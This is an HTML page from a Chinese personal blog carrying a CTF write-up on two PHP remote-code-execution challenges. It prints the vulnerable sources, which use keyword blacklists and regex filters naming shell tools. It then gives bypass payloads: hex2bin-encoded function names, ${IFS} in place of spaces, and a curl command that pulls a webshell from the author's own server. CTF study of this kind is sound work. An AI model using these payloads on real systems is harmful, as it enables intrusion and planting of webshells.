@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>RCE · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-07-11">2024年7月11日</time>
+        
+        
+          <span class="post__readtime">5 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/BUUCTF/">#BUUCTF</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">RCE</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <!--toc-->
+
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="RCE题目"><a href="#RCE题目" class="headerlink" title="RCE题目"></a>RCE题目</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格绕过：  $&#123;IFS&#125;   %09</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Dest0g3-520迎新赛-SimpleRCE"><a href="#Dest0g3-520迎新赛-SimpleRCE" class="headerlink" title="[Dest0g3 520迎新赛]SimpleRCE"></a>[Dest0g3 520迎新赛]SimpleRCE</h2><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>做题时想法</p>
+<ul>
+<li>第一个：nc 反弹shell  <code>==&gt;</code> 自己所知道的能执行系统命令的函数都被ban了。  <code>==&gt;</code>失败</li>
+<li>第二个： payload base64编码之后，配合base64_decode绕过。<code>==&gt;</code> 构造好了之后，才发现<code>decode</code>被ban <code>==&gt;</code>又去找了好几个可以编码&#x2F;解码的函数，发现都有<code>decode</code>…  <code>==&gt;</code> 失败</li>
+</ul>
+<p>看了wp之后</p>
+<ol>
+<li>使用16进制编码绕过。 字符串转16进制所用到的函数是<code>hex2bin()</code>其中没有<code>decode</code>可以绕过</li>
+</ol>
+<h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行dir命令</span><br><span class="line"></span><br><span class="line">aaa=hex2bin(&#x27;73797374656d&#x27;)(hex2bin(&#x27;646972&#x27;));</span><br></pre></td></tr></table></figure>
+
+<h2 id="NewStarCTF-公开赛赛道-So-Baby-RCE"><a href="#NewStarCTF-公开赛赛道-So-Baby-RCE" class="headerlink" title="[NewStarCTF 公开赛赛道]So Baby RCE"></a>[NewStarCTF 公开赛赛道]So Baby RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有ban<code>curl</code>使用curl远程用自己服务器上面下一个马过来,空格过滤用${IFS}绕过</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=curl$&#123;IFS&#125;3*.1**.7*.**3:80$&#123;IFS&#125;-o$&#123;IFS&#125;ma.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240713191725125.png" alt="image-20240713191725125"></p>
+<p><img src="/../img/Typora/image-20240713191733995.png" alt="image-20240713191733995"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/07/11/CTF/DASCTF/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">刷DASCTF</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/07/10/%E5%9F%BA%E7%A1%80/XXE7.10/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">XXE 2024-7-10</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
